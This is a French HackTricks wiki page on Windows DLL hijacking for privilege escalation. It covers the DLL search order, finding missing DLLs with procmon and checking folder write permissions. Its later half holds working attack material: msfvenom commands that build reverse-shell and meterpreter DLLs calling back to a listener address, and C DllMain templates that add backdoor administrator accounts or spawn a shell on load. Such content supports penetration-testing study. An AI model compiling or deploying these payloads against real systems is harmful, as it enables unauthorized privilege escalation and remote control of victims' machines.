# Dll Hijacking

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si vous êtes intéressé par une **carrière en piratage** et pirater l'impossible - **nous recrutons !** (_maîtrise du polonais écrit et parlé requis_).

{% embed url="https://www.stmcyber.com/careers" %}

## Informations de base

Le détournement de DLL implique de manipuler une application de confiance pour charger une DLL malveillante. Ce terme englobe plusieurs tactiques telles que le **leurrage, l'injection et le chargement latéral de DLL**. Il est principalement utilisé pour l'exécution de code, la persistance et, moins couramment, l'élévation de privilèges. Malgré l'accent mis sur l'élévation ici, la méthode de détournement reste cohérente quel que soit l'objectif.

### Techniques courantes

Plusieurs méthodes sont utilisées pour le détournement de DLL, chacune ayant son efficacité en fonction de la stratégie de chargement de DLL de l'application :

1. **Remplacement de DLL** : Remplacer une DLL authentique par une malveillante, en utilisant éventuellement le leurrage de DLL pour préserver la fonctionnalité de la DLL d'origine.
2. **Détournement de l'ordre de recherche de DLL** : Placer la DLL malveillante dans un chemin de recherche avant la DLL légitime, exploitant le modèle de recherche de l'application.
3. **Détournement de DLL fantôme** : Créer une DLL malveillante pour qu'une application la charge, pensant qu'il s'agit d'une DLL requise inexistante.
4. **Redirection de DLL** : Modifier les paramètres de recherche comme `%PATH%` ou les fichiers `.exe.manifest` / `.exe.local` pour diriger l'application vers la DLL malveillante.
5. **Remplacement de DLL WinSxS** : Substituer la DLL légitime par un homologue malveillant dans le répertoire WinSxS, une méthode souvent associée au chargement latéral de DLL.
6. **Détournement de DLL par chemin relatif** : Placer la DLL malveillante dans un répertoire contrôlé par l'utilisateur avec l'application copiée, ressemblant aux techniques d'exécution de proxy binaire.

## Recherche de DLL manquantes

La manière la plus courante de trouver des DLL manquantes dans un système est d'exécuter [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, **en configurant** les **2 filtres suivants** :

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

et afficher simplement l'**Activité du système de fichiers** :

![](<../../.gitbook/assets/image (314).png>)

Si vous recherchez des **DLL manquantes en général**, laissez cela s'exécuter pendant quelques **secondes**.\
Si vous recherchez une **DLL manquante dans un exécutable spécifique**, vous devriez définir **un autre filtre comme "Nom du processus" "contient" "\<nom de l'exécutable>", l'exécuter, et arrêter la capture des événements**.

## Exploitation des DLL manquantes

Pour escalader les privilèges, notre meilleure chance est de pouvoir **écrire une DLL qu'un processus privilégié tentera de charger** dans un **endroit où elle sera recherchée**. Par conséquent, nous pourrons **écrire** une DLL dans un **dossier** où la **DLL est recherchée avant** le dossier où se trouve la **DLL d'origine** (cas étrange), ou nous pourrons **écrire dans un dossier où la DLL sera recherchée** et la **DLL d'origine n'existe pas** dans aucun dossier.

### Ordre de recherche de DLL

**Dans la** [**documentation Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **vous pouvez trouver comment les DLL sont chargées spécifiquement.**

Les applications Windows recherchent des DLL en suivant un ensemble de **chemins de recherche prédéfinis**, en respectant une séquence particulière. Le problème du détournement de DLL survient lorsqu'une DLL malveillante est stratégiquement placée dans l'un de ces répertoires, garantissant qu'elle est chargée avant la DLL authentique. Une solution pour prévenir cela est de s'assurer que l'application utilise des chemins absolus lorsqu'elle fait référence aux DLL dont elle a besoin.

Vous pouvez voir l'**ordre de recherche de DLL sur les systèmes 32 bits** ci-dessous :

1. Le répertoire à partir duquel l'application a été chargée.
2. Le répertoire système. Utilisez la fonction [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) pour obtenir le chemin de ce répertoire.(_C:\Windows\System32_)
3. Le répertoire système 16 bits. Il n'existe pas de fonction qui obtient le chemin de ce répertoire, mais il est recherché. (_C:\Windows\System_)
4. Le répertoire Windows. Utilisez la fonction [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) pour obtenir le chemin de ce répertoire.
1. (_C:\Windows_)
5. Le répertoire actuel.
6. Les répertoires répertoriés dans la variable d'environnement PATH. Notez que cela n'inclut pas le chemin par application spécifié par la clé de registre **App Paths**. La clé **App Paths** n'est pas utilisée lors du calcul du chemin de recherche de DLL.

C'est l'**ordre de recherche par défaut** avec **SafeDllSearchMode** activé. Lorsqu'il est désactivé, le répertoire actuel passe en deuxième position. Pour désactiver cette fonctionnalité, créez la valeur de registre **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** et définissez-la sur 0 (par défaut activé).

Si la fonction [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) est appelée avec **LOAD\_WITH\_ALTERED\_SEARCH\_PATH**, la recherche commence dans le répertoire du module exécutable que **LoadLibraryEx** charge.

Enfin, notez qu'**une DLL peut être chargée en indiquant le chemin absolu au lieu du simple nom**. Dans ce cas, cette DLL **ne sera recherchée que dans ce chemin** (si la DLL a des dépendances, elles seront recherchées comme étant simplement chargées par nom).

Il existe d'autres façons de modifier l'ordre de recherche, mais je ne vais pas les expliquer ici.

#### Exceptions sur l'ordre de recherche de DLL à partir de la documentation Windows

Certaines exceptions à l'ordre de recherche standard des DLL sont notées dans la documentation Windows :

- Lorsqu'une **DLL portant le même nom qu'une déjà chargée en mémoire** est rencontrée, le système contourne la recherche habituelle. Il effectue plutôt une vérification de redirection et un manifeste avant de revenir à la DLL déjà en mémoire. **Dans ce scénario, le système ne lance pas de recherche de la DLL**.
- Dans les cas où la DLL est reconnue comme une **DLL connue** pour la version Windows actuelle, le système utilisera sa version de la DLL connue, ainsi que toutes ses DLL dépendantes, **évitant le processus de recherche**. La clé de registre **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contient une liste de ces DLL connues.
- Si une **DLL a des dépendances**, la recherche de ces DLL dépendantes est effectuée comme si elles étaient indiquées uniquement par leurs **noms de module**, indépendamment du fait que la DLL initiale ait été identifiée par un chemin complet.

### Élévation de privilèges

**Exigences** :

- Identifier un processus qui fonctionne ou fonctionnera sous des **privilèges différents** (mouvement horizontal ou latéral), qui **manque d'une DLL**.
- Assurez-vous que l'accès en **écriture** est disponible pour tout **répertoire** dans lequel la **DLL** sera **recherchée**. Cet emplacement peut être le répertoire de l'exécutable ou un répertoire dans le chemin système.

Oui, les exigences sont compliquées à trouver car **par défaut il est assez étrange de trouver un exécutable privilégié manquant d'une DLL** et c'est encore **plus étrange d'avoir des autorisations d'écriture sur un dossier du chemin système** (vous ne pouvez pas par défaut). Mais, dans des environnements mal configurés, cela est possible.\
Dans le cas où vous avez de la chance et que vous répondez aux exigences, vous pourriez consulter le projet [UACME](https://github.com/hfiref0x/UACME). Même si le **but principal du projet est de contourner l'UAC**, vous pourriez y trouver un **PoC** de détournement de DLL pour la version Windows que vous pouvez utiliser (probablement en changeant simplement le chemin du dossier où vous avez des autorisations d'écriture).

Notez que vous pouvez **vérifier vos autorisations dans un dossier** en faisant :
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Et **vérifiez les autorisations de tous les dossiers à l'intérieur du CHEMIN** :
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vous pouvez également vérifier les imports d'un exécutable et les exports d'une DLL avec :
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Pour un guide complet sur **comment abuser du Dll Hijacking pour escalader les privilèges** avec des autorisations d'écriture dans un **dossier du chemin système**, consultez :

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Outils automatisés

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) vérifiera si vous avez des autorisations d'écriture sur un dossier à l'intérieur du chemin système.\
D'autres outils automatisés intéressants pour découvrir cette vulnérabilité sont les fonctions de **PowerSploit** : _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ et _Write-HijackDll._

### Exemple

Dans le cas où vous trouvez un scénario exploitable, l'une des choses les plus importantes pour l'exploiter avec succès serait de **créer un dll qui exporte au moins toutes les fonctions que l'exécutable importera de celui-ci**. Quoi qu'il en soit, notez que le Dll Hijacking est pratique pour [passer du niveau d'intégrité Moyen à Elevé **(contournement de l'UAC)**](../authentication-credentials-uac-and-efs.md#uac) ou de **l'Elevé à SYSTEM**. Vous pouvez trouver un exemple de **comment créer un dll valide** à l'intérieur de cette étude sur le Dll Hijacking axée sur le Dll Hijacking pour l'exécution : [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
De plus, dans la **prochaine section**, vous pouvez trouver quelques **codes dll de base** qui pourraient être utiles en tant que **modèles** ou pour créer un **dll avec des fonctions non requises exportées**.

## **Création et compilation de Dlls**

### **Dll Proxifying**

Fondamentalement, un **proxy Dll** est un Dll capable d'**exécuter votre code malveillant lorsqu'il est chargé** mais aussi d'**exposer** et de **fonctionner** comme **attendu** en **relayant tous les appels à la vraie bibliothèque**.

Avec l'outil [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ou [**Spartacus**](https://github.com/Accenture/Spartacus), vous pouvez en fait **indiquer un exécutable et sélectionner la bibliothèque** que vous souhaitez proxifier et **générer un dll proxifié** ou **indiquer le Dll** et **générer un dll proxifié**.

### **Meterpreter**

**Obtenir un shell inversé (x64) :**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtenir un meterpreter (x86) :**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Créez un utilisateur (je n'ai pas vu de version x64) :**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Le vôtre

Notez que dans plusieurs cas, la DLL que vous compilez doit **exporter plusieurs fonctions** qui seront chargées par le processus victime, si ces fonctions n'existent pas, le **binaire ne pourra pas les charger** et l'**exploit échouera**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Références
* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si vous êtes intéressé par une **carrière en piratage** et pirater l'impiratable - **nous recrutons !** (_maîtrise du polonais à l'écrit et à l'oral requise_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong> !</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
